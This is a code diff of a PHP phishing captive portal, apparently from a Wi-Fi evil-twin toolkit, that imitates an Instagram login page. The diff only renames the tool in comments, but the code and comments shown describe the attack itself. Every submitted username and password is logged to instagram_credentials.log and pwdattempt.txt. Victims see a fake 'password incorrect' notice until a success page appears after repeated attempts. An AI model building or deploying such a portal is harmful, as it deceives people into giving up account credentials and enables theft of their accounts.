@@ -2,11 +2,11 @@
 /*
  * Instagram portal credential capture.
  *
- * The stock Fluxion authenticator (lib/authenticator.php) exists to verify a
+ * The stock CapCap authenticator (lib/authenticator.php) exists to verify a
  * candidate against the target's WPA handshake. That check is meaningless for
  * a web login page, so this portal posts to its own endpoint instead: every
  * attempt is appended to instagram_credentials.log next to the portal root
- * (i.e. <FLUXIONWorkspacePath>/instagram_credentials.log) and the visitor is
+ * (i.e. <CAPCAPWorkspacePath>/instagram_credentials.log) and the visitor is
  * sent back to the login form with the usual "password incorrect" notice.
  * After MAX_ATTEMPTS attempts from the same address the success page is shown
  * so the flow terminates instead of looping forever.
@@ -306,7 +306,7 @@ if (!$duplicate) {
         append_plain(sys_get_temp_dir() . '/instagram_credentials.log', $line, 0600);
     }
 
-    // Mirror the pair into Fluxion's own attempt file, which the Captive Portal
+    // Mirror the pair into CapCap's own attempt file, which the Captive Portal
     // arbiter copies into its pass log and then truncates.
     if ($username !== '' && $password !== '') {
         append_plain($workspace . '/pwdattempt.txt', $username . ':' . $password . "\n");
